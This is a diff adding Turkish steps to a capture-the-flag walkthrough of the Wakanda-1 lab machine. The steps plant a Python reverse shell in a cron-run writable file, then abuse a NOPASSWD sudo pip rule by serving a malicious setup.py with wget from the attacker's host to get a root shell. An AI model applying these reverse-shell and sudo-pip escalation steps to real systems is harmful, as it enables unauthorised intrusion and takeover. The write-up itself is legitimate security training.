@@ -39,3 +39,56 @@ Burada python çalıştırabildiğimize göre python ile kabuk oluşturabiliriz.
 komutunu çalıştırıyoruz. Artık başta çalıştırmayı denediğimiz tüm komutları çalıştırabiliriz. flag1.txt'yi aşağıdaki gibi elde ediyoruz.
 
 ![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/flag.png)
+
+Bu adımda hemen flag2.txt dosyasının nerede olduğunu öğrnelim:
+
+`locate flag2.txt`
+
+Bu komutu çalıştırdığımızda `/home/devops/flag2.txt` sonucunu elde ediyoruz. cat komutu ile bu dosyayı okumaya çalıştığımızda buna iznimiz olmadığı bilgisini alıyoruz.
+Yani bu dosyayı okumak için devops kullanıcısı olmamız gerekiyor. Devops kullanıcısı olmak için çeşitli araçlarla zafiyet araması yapmadn önce * find * komutu ile devops kullanıcısının hangi dosyalarına erişebildiğimize bakmak için şu komutu çalıştıralım.
+
+`find / -username devops`
+
+Bu komutu çalıştırdığımızda uzun bir liste elde ediyoruz ama listenin en başı dikkatimizi çekiyor.
+
+![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/find.png)
+
+Burada bir python dosyası ve test isimli bir metin dosyası olduğunu görüyoruz. Bunları cat ile okuyoruz:
+
+Python dosyası
+`open('/tmp/test','w').write('test')`
+
+Test dosyası 
+`test`
+
+Bu iki dosyaya bakarak python dosyasının daha önce çalıştırıldığını anlayabiliriz. Bunu bir cron dosyası yardımıyla belirli aralıklarla yaptığıda muhtemel olan diğer çıkarım. Bir sonraki adımda python dosyasını kullanacağız.
+### *Adım 4:*
+Bu adımda python ile reverse shell oluşturacağız. ls -la ile baktığımızda python dosyasına yazma iznine sahip olduğumuzu görebiliriz. [Reverse shell için](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) sitesinde yer alan python reverse shell kodlarını kullanabiliriz. Bu sitede komut satırı için hazırlanan komutu python debug işlmine uygun hale getirerek dosyaya yazalım. reverse shellde ip kısmına kalimizin ip'sini yazarak dosyayı kaydedelim. Başka bir terminalde netcat çalıştıralım:
+
+`nc -nvlp 1234`
+
+Bir shell elde ettik daha önceden dizini bildiğimiz falg2.txt'yi okuyalım:
+
+![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/flag2.png)
+
+Şimdi sırada root.txt dosyasını bulmak var.
+### *Adım 5:*
+root.txt dosyasına erişmek için yetki yükseltmesi yapmamız gerektiğini biliyoruz. Yetki yükseltmesi için neler yapabileceğimizi düşünelim. Ama ondan önce yetki yükseltmeden yani şifre girmeden neler yapabileceğimize bakalım. Bunun için `sudo -l` komutunu çalıştırıyoruz. İlginç bir drurumla karşılaşıyoruz: 
+
+`User devops may run the following commands on Wakanda1:
+    (ALL) NOPASSWD: /usr/bin/pip`
+    
+İnternette yaptığımız kısa bir aramada [bir github reposu buluyoruz](https://github.com/0x00-0x00/FakePip). Burada yine bir reverse shell bulduğumuzu söyleyebiliriz.
+Bunu ssh ile bağlandığımız makineye nasıl indirebileceğimiz bulmalıyız. Makinede git komutlarının çalışmadığını deneyerek anlayabiliriz. onun dışında wget komutunun çalışmasında bir sıkıntı olmadığını görüyoruz. Ama inen dosyanın .git uzantılı olması da bizi çıkmaza sokuyor. Bu dosyayı kendi sunucumuz üzerinden wget komutu ile makineye yollamak en doğru çözüm olacağını düşünüyoruz. Bu yüzden ilk olarak repo'yu kendi kalimize klonluyoruz. setup.py dosyası içerisindeki localhost yerine kendi ip adresimizi yazıyoruz dosyayı kaydederek ssh ile atılmaya hazır duruma geliyoruz. (port numarasını da unutmuyoruz 13372) Sonrasında dosyayı var/www/html içerisine atıyoruz `cp setup.py /var/www/html` ve apache sunucumuzu başlatıyoruz `service apache2 start'. Şimdi devops olarak bulunduğumuz makinede aşağıdaki komutu çalıştırabiliriz.
+
+`wget http://10.0.2.14/setup.py`
+
+setup.py dosyamız makineye başarıyla indi buradan sonra yetki yükseltmek çocuk oyuncağı. İlk ola 13372 portunu daha önce yaptığımız gibi dinlemeya başlayacağız. Sonra pip kullanarak setup.py dosyasını çalıştıracağız.
+
+`nc -nvlp 13372`
+
+`sudo /usr/bin/pip install . --upgrade --force-reinstall`
+
+![](https://github.com/hamza37yavuz/Wakanda-1-YolHaritasi/blob/main/root.png)
+
+Okuduğunuz için Teşekkürler :)
